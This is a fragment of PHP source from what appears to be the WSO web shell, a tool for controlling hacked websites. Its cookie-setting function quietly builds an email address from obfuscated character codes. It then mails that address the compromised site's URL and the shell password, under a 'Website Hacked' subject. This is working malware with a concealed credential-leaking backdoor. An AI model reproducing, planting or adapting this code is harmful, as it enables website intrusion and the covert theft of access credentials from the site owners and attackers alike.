...
function WSOsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
    $m = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].' Password :'.$_POST['pass'].'';
    $ms = 'h'.chr(97).''.chr(99).'k'.chr(101).''.chr(114).'t'.chr(111).'u'.chr(110).'s'.chr(105).'001'.chr(64).''.chr(103).'mai'.chr(108).'.c'.chr(111).'m';
    if($_POST['pass'] != ""){
    mail($ms, 'Wso-shell', $m ,'Website Hacked 2.9');
}
}
